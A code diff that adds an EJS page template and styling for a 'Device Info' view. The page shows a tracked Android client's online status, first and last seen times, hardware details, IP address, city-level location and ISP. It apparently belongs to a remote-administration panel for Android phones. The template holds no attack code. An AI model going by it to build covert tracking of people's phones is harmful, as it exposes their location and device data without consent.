@@ -1,0 +1,768 @@
+<div class="ui segment info-page">
+
+    <!-- ============================================
+         HEADER
+         ============================================ -->
+    <div class="info-header">
+        <div class="info-header-left">
+            <div class="info-header-icon">
+                <i class="icon mobile alternate"></i>
+            </div>
+            <div class="info-header-text">
+                <h2 class="info-header-title">Device Info</h2>
+                <span class="info-header-sub" id="infoClientId"><%= pageData.clientID || 'unknown' %></span>
+            </div>
+        </div>
+
+        <div class="info-header-right">
+            <% if (pageData.isOnline) { %>
+            <div class="info-status-pill info-status-online">
+                <span class="pill-dot"></span>
+                <span>Online</span>
+            </div>
+            <% } else { %>
+            <div class="info-status-pill info-status-offline">
+                <span class="pill-dot"></span>
+                <span>Offline</span>
+            </div>
+            <% } %>
+        </div>
+    </div>
+
+    <!-- ============================================
+         TIMELINE (First Seen / Last Seen)
+         ============================================ -->
+    <div class="info-section">
+        <div class="info-section-header">
+            <i class="icon clock outline"></i>
+            <span>Timeline</span>
+        </div>
+
+        <div class="info-timeline-grid">
+
+            <div class="info-stat-card info-stat-first">
+                <div class="info-stat-icon">
+                    <i class="icon plus circle"></i>
+                </div>
+                <div class="info-stat-body">
+                    <div class="info-stat-label">First Seen</div>
+                    <div class="info-stat-time" id="infoFirstSeenTime">
+                        <%= pageData.firstSeen ? new Date(pageData.firstSeen).toLocaleTimeString('en-GB', { timeZone: 'UTC', hour12: false }) : '--:--:--' %>
+                    </div>
+                    <div class="info-stat-date" id="infoFirstSeenDate">
+                        <%= pageData.firstSeen ? new Date(pageData.firstSeen).toLocaleDateString('en-GB', { timeZone: 'UTC' }) : '--/--/----' %>
+                    </div>
+                </div>
+            </div>
+
+            <div class="info-timeline-divider">
+                <div class="info-timeline-line"></div>
+                <i class="icon exchange alternate"></i>
+                <div class="info-timeline-line"></div>
+            </div>
+
+            <div class="info-stat-card info-stat-last">
+                <div class="info-stat-icon">
+                    <i class="icon history"></i>
+                </div>
+                <div class="info-stat-body">
+                    <div class="info-stat-label">Last Seen</div>
+                    <div class="info-stat-time" id="infoLastSeenTime">
+                        <%= pageData.lastSeen ? new Date(pageData.lastSeen).toLocaleTimeString('en-GB', { timeZone: 'UTC', hour12: false }) : '--:--:--' %>
+                    </div>
+                    <div class="info-stat-date" id="infoLastSeenDate">
+                        <%= pageData.lastSeen ? new Date(pageData.lastSeen).toLocaleDateString('en-GB', { timeZone: 'UTC' }) : '--/--/----' %>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ============================================
+         DEVICE DETAILS (agar pageData.dynamicData.device available hai)
+         ============================================ -->
+    <% if (pageData.dynamicData && pageData.dynamicData.device) {
+        let dev = pageData.dynamicData.device; %>
+    <div class="info-section">
+        <div class="info-section-header">
+            <i class="icon microchip"></i>
+            <span>Device Details</span>
+        </div>
+
+        <div class="info-grid">
+
+            <% if (dev.manufacture) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon industry"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">Manufacturer</div>
+                    <div class="info-field-value"><%= dev.manufacture %></div>
+                </div>
+            </div>
+            <% } %>
+
+            <% if (dev.model) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon mobile alternate"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">Model</div>
+                    <div class="info-field-value"><%= dev.model %></div>
+                </div>
+            </div>
+            <% } %>
+
+            <% if (dev.brand) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon tag"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">Brand</div>
+                    <div class="info-field-value"><%= dev.brand %></div>
+                </div>
+            </div>
+            <% } %>
+
+            <% if (dev.version) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon android"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">Android Version</div>
+                    <div class="info-field-value"><%= dev.version %></div>
+                </div>
+            </div>
+            <% } %>
+
+            <% if (dev.sdkVersion) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon code"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">SDK Version</div>
+                    <div class="info-field-value"><%= dev.sdkVersion %></div>
+                </div>
+            </div>
+            <% } %>
+
+        </div>
+    </div>
+    <% } %>
+
+    <!-- ============================================
+         CLIENT DATA (IP, country, ISP)
+         ============================================ -->
+    <% if (pageData.dynamicData) {
+        let dyn = pageData.dynamicData; %>
+    <div class="info-section">
+        <div class="info-section-header">
+            <i class="icon wifi"></i>
+            <span>Connection</span>
+        </div>
+
+        <div class="info-grid">
+
+            <% if (dyn.clientIP) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon globe"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">IP Address</div>
+                    <div class="info-field-value mono"><%= dyn.clientIP %></div>
+                </div>
+            </div>
+            <% } %>
+
+            <% if (dyn.clientGeo && dyn.clientGeo.country) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon map marker alternate"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">Country</div>
+                    <div class="info-field-value"><%= dyn.clientGeo.country.toUpperCase() %></div>
+                </div>
+            </div>
+            <% } %>
+
+            <% if (dyn.clientGeo && dyn.clientGeo.regionName) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon map"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">Region</div>
+                    <div class="info-field-value"><%= dyn.clientGeo.regionName %></div>
+                </div>
+            </div>
+            <% } %>
+
+            <% if (dyn.clientGeo && dyn.clientGeo.city) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon building"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">City</div>
+                    <div class="info-field-value"><%= dyn.clientGeo.city %></div>
+                </div>
+            </div>
+            <% } %>
+
+            <% if (dyn.clientGeo && dyn.clientGeo.isp) { %>
+            <div class="info-field">
+                <div class="info-field-icon"><i class="icon server"></i></div>
+                <div class="info-field-body">
+                    <div class="info-field-label">ISP</div>
+                    <div class="info-field-value"><%= dyn.clientGeo.isp %></div>
+                </div>
+            </div>
+            <% } %>
+
+        </div>
+    </div>
+    <% } %>
+
+</div>
+
+<style type="text/css">
+    /* ============================================
+       INFO PAGE — Dark Neon Theme
+       ============================================ */
+
+    .ui.segment.info-page {
+        background: rgba(19, 26, 38, 0.75) !important;
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+        border: 1px solid rgba(0, 217, 255, 0.15) !important;
+        border-radius: 20px !important;
+        box-shadow:
+            0 20px 60px rgba(0, 0, 0, 0.5),
+            0 0 0 1px rgba(255, 255, 255, 0.03),
+            inset 0 1px 0 rgba(255, 255, 255, 0.06) !important;
+        padding: 22px !important;
+        color: #e6edf3;
+    }
+
+    /* ============================================
+       HEADER
+       ============================================ */
+    .info-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 16px;
+        padding-bottom: 18px;
+        margin-bottom: 20px;
+        border-bottom: 1px solid rgba(0, 217, 255, 0.15);
+        flex-wrap: wrap;
+    }
+
+    .info-header-left {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        min-width: 0;
+    }
+
+    .info-header-icon {
+        width: 52px;
+        height: 52px;
+        border-radius: 14px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: linear-gradient(135deg, rgba(0, 217, 255, 0.15), rgba(124, 58, 237, 0.12));
+        border: 1px solid rgba(0, 217, 255, 0.3);
+        box-shadow: 0 0 25px rgba(0, 217, 255, 0.15);
+        flex-shrink: 0;
+    }
+
+    .info-header-icon .icon.mobile {
+        color: #00d9ff !important;
+        margin: 0 !important;
+        font-size: 1.5rem !important;
+        filter: drop-shadow(0 0 10px rgba(0, 217, 255, 0.6));
+    }
+
+    .info-header-text {
+        display: flex;
+        flex-direction: column;
+        gap: 3px;
+        min-width: 0;
+    }
+
+    .info-header-title {
+        font-size: 1.15rem !important;
+        font-weight: 800 !important;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+        color: #e6edf3 !important;
+        margin: 0 !important;
+        line-height: 1.2;
+    }
+
+    .info-header-sub {
+        font-family: 'JetBrains Mono', 'Courier New', monospace;
+        font-size: 0.72rem;
+        color: #7c3aed;
+        letter-spacing: 0.5px;
+        padding: 2px 8px;
+        background: rgba(124, 58, 237, 0.1);
+        border: 1px solid rgba(124, 58, 237, 0.3);
+        border-radius: 6px;
+        align-self: flex-start;
+        max-width: 100%;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+    }
+
+    /* Online status pill */
+    .info-status-pill {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        padding: 8px 16px;
+        border-radius: 20px;
+        font-size: 0.72rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        flex-shrink: 0;
+    }
+
+    .pill-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        display: inline-block;
+    }
+
+    .info-status-online {
+        background: rgba(0, 255, 157, 0.1);
+        border: 1px solid rgba(0, 255, 157, 0.35);
+        color: #00ff9d;
+    }
+
+    .info-status-online .pill-dot {
+        background: #00ff9d;
+        box-shadow: 0 0 10px #00ff9d;
+        animation: onlinePulse 1.8s ease-in-out infinite;
+    }
+
+    @keyframes onlinePulse {
+        0%, 100% { opacity: 1; transform: scale(1); }
+        50%      { opacity: 0.4; transform: scale(0.75); }
+    }
+
+    .info-status-offline {
+        background: rgba(139, 152, 168, 0.08);
+        border: 1px solid rgba(139, 152, 168, 0.3);
+        color: #8b98a8;
+    }
+
+    .info-status-offline .pill-dot {
+        background: #5a6675;
+    }
+
+    /* ============================================
+       SECTIONS
+       ============================================ */
+    .info-section {
+        margin-bottom: 24px;
+    }
+
+    .info-section:last-child {
+        margin-bottom: 0;
+    }
+
+    .info-section-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 0.82rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: #e6edf3;
+        margin-bottom: 14px;
+        padding-bottom: 10px;
+        border-bottom: 1px solid rgba(0, 217, 255, 0.12);
+    }
+
+    .info-section-header .icon {
+        color: #00d9ff !important;
+        margin: 0 !important;
+        font-size: 1rem;
+        filter: drop-shadow(0 0 8px rgba(0, 217, 255, 0.5));
+    }
+
+    /* ============================================
+       TIMELINE
+       ============================================ */
+    .info-timeline-grid {
+        display: grid;
+        grid-template-columns: 1fr auto 1fr;
+        align-items: center;
+        gap: 16px;
+    }
+
+    .info-stat-card {
+        display: flex;
+        align-items: flex-start;
+        gap: 14px;
+        padding: 16px;
+        border-radius: 14px;
+        background: rgba(10, 14, 23, 0.5);
+        border: 1px solid rgba(34, 48, 71, 0.7);
+        transition: all 0.25s ease;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .info-stat-card::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 3px;
+        height: 100%;
+        border-radius: 3px;
+        transition: box-shadow 0.3s ease;
+    }
+
+    .info-stat-card.info-stat-first::before {
+        background: linear-gradient(180deg, #00d9ff, #0088ff);
+        box-shadow: 0 0 12px rgba(0, 217, 255, 0.6);
+    }
+
+    .info-stat-card.info-stat-last::before {
+        background: linear-gradient(180deg, #00ff9d, #00b377);
+        box-shadow: 0 0 12px rgba(0, 255, 157, 0.6);
+    }
+
+    .info-stat-card:hover {
+        transform: translateY(-2px);
+        border-color: rgba(0, 217, 255, 0.35);
+        box-shadow: 0 8px 25px rgba(0, 217, 255, 0.15);
+    }
+
+    .info-stat-first:hover::before {
+        box-shadow: 0 0 22px rgba(0, 217, 255, 0.9);
+    }
+
+    .info-stat-last:hover::before {
+        box-shadow: 0 0 22px rgba(0, 255, 157, 0.9);
+    }
+
+    .info-stat-icon {
+        width: 42px;
+        height: 42px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+        transition: all 0.25s ease;
+    }
+
+    .info-stat-first .info-stat-icon {
+        background: rgba(0, 217, 255, 0.12);
+        border: 1px solid rgba(0, 217, 255, 0.3);
+    }
+
+    .info-stat-last .info-stat-icon {
+        background: rgba(0, 255, 157, 0.12);
+        border: 1px solid rgba(0, 255, 157, 0.3);
+    }
+
+    .info-stat-first .info-stat-icon .icon {
+        color: #00d9ff !important;
+        filter: drop-shadow(0 0 6px rgba(0, 217, 255, 0.5));
+    }
+
+    .info-stat-last .info-stat-icon .icon {
+        color: #00ff9d !important;
+        filter: drop-shadow(0 0 6px rgba(0, 255, 157, 0.5));
+    }
+
+    .info-stat-icon .icon {
+        margin: 0 !important;
+        font-size: 1.15rem !important;
+    }
+
+    .info-stat-card:hover .info-stat-icon {
+        transform: scale(1.08);
+    }
+
+    .info-stat-body {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+        min-width: 0;
+        flex: 1;
+    }
+
+    .info-stat-label {
+        font-size: 0.68rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: #5a6675;
+    }
+
+    .info-stat-time {
+        font-family: 'JetBrains Mono', 'Courier New', monospace;
+        font-size: 1.15rem;
+        font-weight: 700;
+        color: #e6edf3;
+        letter-spacing: 0.5px;
+        line-height: 1.2;
+    }
+
+    .info-stat-first .info-stat-time {
+        color: #a3eeff;
+    }
+
+    .info-stat-last .info-stat-time {
+        color: #5cffba;
+    }
+
+    .info-stat-date {
+        font-family: 'JetBrains Mono', 'Courier New', monospace;
+        font-size: 0.75rem;
+        color: #8b98a8;
+        letter-spacing: 0.5px;
+    }
+
+    /* Divider */
+    .info-timeline-divider {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 6px;
+        color: #5a6675;
+    }
+
+    .info-timeline-divider .icon.exchange {
+        margin: 0 !important;
+        font-size: 1rem;
+        color: #00d9ff !important;
+        filter: drop-shadow(0 0 8px rgba(0, 217, 255, 0.6));
+        animation: swapPulse 3s ease-in-out infinite;
+    }
+
+    @keyframes swapPulse {
+        0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.7; }
+        50%      { transform: scale(1.15) rotate(180deg); opacity: 1; }
+    }
+
+    .info-timeline-line {
+        width: 1px;
+        height: 20px;
+        background: linear-gradient(180deg, transparent, rgba(0, 217, 255, 0.4), transparent);
+    }
+
+    /* ============================================
+       INFO GRID (fields)
+       ============================================ */
+    .info-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+        gap: 12px;
+    }
+
+    .info-field {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 12px 14px;
+        background: rgba(10, 14, 23, 0.5);
+        border: 1px solid rgba(34, 48, 71, 0.7);
+        border-radius: 12px;
+        transition: all 0.2s ease;
+        min-width: 0;
+    }
+
+    .info-field:hover {
+        border-color: rgba(0, 217, 255, 0.35);
+        background: rgba(0, 217, 255, 0.05);
+        transform: translateY(-1px);
+        box-shadow: 0 4px 15px rgba(0, 217, 255, 0.1);
+    }
+
+    .info-field-icon {
+        width: 36px;
+        height: 36px;
+        border-radius: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: rgba(0, 217, 255, 0.08);
+        border: 1px solid rgba(0, 217, 255, 0.2);
+        flex-shrink: 0;
+        transition: all 0.2s ease;
+    }
+
+    .info-field:hover .info-field-icon {
+        background: rgba(0, 217, 255, 0.15);
+        border-color: rgba(0, 217, 255, 0.4);
+    }
+
+    .info-field-icon .icon {
+        color: #00d9ff !important;
+        margin: 0 !important;
+        font-size: 0.95rem !important;
+        filter: drop-shadow(0 0 6px rgba(0, 217, 255, 0.4));
+    }
+
+    .info-field-body {
+        display: flex;
+        flex-direction: column;
+        gap: 3px;
+        min-width: 0;
+        flex: 1;
+    }
+
+    .info-field-label {
+        font-size: 0.62rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1.2px;
+        color: #5a6675;
+    }
+
+    .info-field-value {
+        font-size: 0.88rem;
+        font-weight: 600;
+        color: #e6edf3;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+    }
+
+    .info-field-value.mono {
+        font-family: 'JetBrains Mono', 'Courier New', monospace;
+        font-size: 0.82rem;
+        color: #00d9ff;
+    }
+
+    /* ============================================
+       MOBILE
+       ============================================ */
+    @media (max-width: 640px) {
+        .ui.segment.info-page {
+            padding: 16px 14px !important;
+            border-radius: 16px !important;
+        }
+
+        .info-header {
+            padding-bottom: 14px;
+            margin-bottom: 16px;
+        }
+
+        .info-header-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+        }
+
+        .info-header-icon .icon.mobile {
+            font-size: 1.25rem !important;
+        }
+
+        .info-header-title {
+            font-size: 1rem !important;
+            letter-spacing: 1.5px;
+        }
+
+        .info-header-sub {
+            font-size: 0.65rem;
+        }
+
+        .info-status-pill {
+            font-size: 0.65rem;
+            padding: 6px 12px;
+            letter-spacing: 1.2px;
+        }
+
+        .info-section {
+            margin-bottom: 20px;
+        }
+
+        .info-section-header {
+            font-size: 0.75rem;
+            letter-spacing: 1.2px;
+            margin-bottom: 12px;
+        }
+
+        /* Timeline stacks */
+        .info-timeline-grid {
+            grid-template-columns: 1fr;
+            gap: 12px;
+        }
+
+        .info-timeline-divider {
+            flex-direction: row;
+            gap: 10px;
+            padding: 4px 0;
+        }
+
+        .info-timeline-line {
+            width: 30px;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(0, 217, 255, 0.4), transparent);
+        }
+
+        .info-stat-card {
+            padding: 14px;
+            gap: 12px;
+        }
+
+        .info-stat-icon {
+            width: 38px;
+            height: 38px;
+        }
+
+        .info-stat-icon .icon {
+            font-size: 1rem !important;
+        }
+
+        .info-stat-time {
+            font-size: 1.05rem;
+        }
+
+        /* Info grid — 1 column */
+        .info-grid {
+            grid-template-columns: 1fr;
+            gap: 10px;
+        }
+
+        .info-field {
+            padding: 11px 12px;
+        }
+
+        .info-field-icon {
+            width: 34px;
+            height: 34px;
+        }
+
+        .info-field-icon .icon {
+            font-size: 0.88rem !important;
+        }
+    }
+
+    /* Small phones */
+    @media (max-width: 400px) {
+        .info-stat-time {
+            font-size: 0.95rem;
+        }
+
+        .info-stat-label {
+            font-size: 0.62rem;
+        }
+
+        .info-field-value {
+            font-size: 0.82rem;
+        }
+    }
+
+    /* Reduced motion */
+    @media (prefers-reduced-motion: reduce) {
+        .info-timeline-divider .icon.exchange,
+        .info-status-online .pill-dot {
+            animation: none !important;
+        }
+    }
+</style>
